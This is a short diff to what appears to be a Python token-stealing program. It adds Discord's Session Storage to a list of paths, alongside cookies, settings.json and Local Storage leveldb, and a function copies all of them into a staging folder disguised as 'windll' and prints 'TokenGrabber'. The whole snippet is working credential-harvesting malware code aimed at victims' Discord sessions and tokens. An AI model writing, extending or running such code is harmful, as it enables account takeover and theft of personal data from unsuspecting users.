@@ -24,6 +24,7 @@ all needed paths
 path3 = r"discord\Network\Cookies"
 path1 = r"discord\settings.json"
 path2 = r'discord\Local Storage\leveldb'
+path3 = r'discord\Session Storage'
 
 def Discord(data):
     try:
@@ -35,6 +36,10 @@ def Discord(data):
         copy2(user+ sep + path1,rf'{pathtofile}\windll\Messengers\Discord')# copy data
         try:
             copytree(user+ sep + path2,rf'{pathtofile}\windll\Messengers\Discord\Local Storage\leveldb')# copy dir
+        except:
+            pass
+        try:
+            copytree(user+ sep + path3,rf'{pathtofile}\windll\Messengers\Discord\Session Storage')# copy dir
         except:
             pass
         print("TokenGrabber")
